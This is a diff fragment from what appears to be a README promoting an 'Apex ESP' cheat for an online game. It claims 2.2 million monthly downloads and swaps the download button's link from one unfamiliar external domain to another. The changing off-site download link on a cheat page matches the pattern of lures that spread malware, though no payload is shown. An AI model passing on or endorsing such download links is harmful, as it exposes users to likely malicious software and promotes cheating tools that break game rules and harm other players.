@@ -49,7 +49,7 @@ A: Yes — preview deathbox contents from distance.
 
 **Monthly downloads:** 2.2m+
 
-[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/apexesp26)
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/apexesp26)
 
 ---
 
